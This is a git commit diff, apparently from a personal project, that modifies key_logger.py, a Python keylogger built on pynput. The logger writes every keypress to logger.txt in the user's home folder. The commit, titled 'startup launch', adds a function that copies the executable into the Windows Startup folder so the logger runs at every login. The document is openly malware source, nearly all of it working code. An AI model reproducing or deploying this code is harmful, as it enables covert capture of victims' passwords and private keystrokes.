e3570e229d24e7c0089b789d54206847750a1c6b
AhmedZEKRI <AhmedZEKRI@DESKTOP-1FA5022>
2021-06-22 12:06:37 +0100

    startup launch

--- key_logger.py
+++ key_logger.py
@@ -1,62 +1,64 @@
-# -*- coding: utf-8 -*-
+import os
 import re
+import shutil
 import sys
 from pathlib import Path
 
 from pynput.keyboard import Listener
-import os
 
 line_length = 0
 
 
 def key_recorder(key):
-    if '.pyw' in sys.argv[0]:
-        home = str(Path.home())
-    else:
-        home = ''
-    f = open(os.path.join(home, 'logger.txt'), 'a+')
-    keyo = str(key)
+    f = open(os.path.join(str(Path.home()), 'logger.txt'), 'a+')
+    str_key = str(key)
     global line_length
     line_length += 1
     if line_length >= 50:
         f.write("\n")
         line_length = 0
-    if keyo == "Key.enter":
+    if str_key == "Key.enter":
         f.write('\n')
-    elif keyo == "Key.space":
+    elif str_key == "Key.space":
         f.write(" ")
-    elif keyo == "Key.backspace":
-        f.write(" {" + keyo + "} ")
+    elif str_key == "Key.backspace":
+        f.write(" {del} ")
         #     size = f.tell()  # the size...
         #     f.truncate(size - 1)
-    elif len(re.findall(r'Key.([\w\d]+)', keyo)) > 0:
-        if len(re.findall(r'Key.([\w\d]+)', keyo)[0]) > 1:
+    elif len(re.findall(r'Key.([\w\d]+)', str_key)) > 0:
+        if len(re.findall(r'Key.([\w\d]+)', str_key)[0]) > 1:
             f.write("")
-    elif len(re.findall(r'(x[\d]+)', keyo)) > 0:
+    elif len(re.findall(r'(x[\d]+)', str_key)) > 0:
         f.write('')
-    elif len(re.findall(r'<([\d]+)>', keyo)) > 0:
-        if int(re.findall(r'<([\d]+)>', keyo)[0]) - 96 < 10:
-            f.write(str(int(re.findall(r'<([\d]+)>', keyo)[0]) - 96))
-        elif re.findall(r'<([\d]+)>', keyo)[0] == '110':
+    elif len(re.findall(r'<([\d]+)>', str_key)) > 0:
+        if int(re.findall(r'<([\d]+)>', str_key)[0]) - 96 < 10:
+            f.write(str(int(re.findall(r'<([\d]+)>', str_key)[0]) - 96))
+        elif re.findall(r'<([\d]+)>', str_key)[0] == '110':
             f.write('.')
-
-
-    # elif keyo == "Key.alt_l" or keyo == "Key.tab":
-    #     f.write('')
-    # elif keyo == "Key.ctrl_l":
-    #     f.write('')
-    # elif keyo == "Key.alt_gr":
-    #     f.write('')
-    # elif keyo == "Key.up" or keyo == "Key.down":
-    #     f.write('')
-    # elif keyo == "Key.right" or keyo == "Key.left":
-    #     f.write('')
-    # elif len(re.findall(r'(x[\d]+)', keyo)) > 0:
-    #     f.write('')
     else:
-        print(keyo)
-        f.write(keyo.replace("'", ""))
+        print(str_key)
+        f.write(str_key.replace("'", ""))
 
 
-with Listener(on_press=key_recorder) as l:
-    l.join()
+def copy_to_startup_folder():
+    try:
+        file_name = re.findall(r'([^\\w\d\W]+).(py|exe|pyw)', sys.argv[0])[0][0] + ".exe"
+
+        shutil.copy(sys.argv[0],
+                    os.path.join(str(Path.home()), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu',
+                                 'Programs',
+                                 'Startup',
+                                 file_name))
+
+        return False
+    except shutil.SameFileError:
+        print('File is in startup folder')
+        return True
+
+
+if __name__ == '__main__':
+    if '.exe' in sys.argv[0]:
+
+        if copy_to_startup_folder():
+            with Listener(on_press=key_recorder) as listener:
+                listener.join()
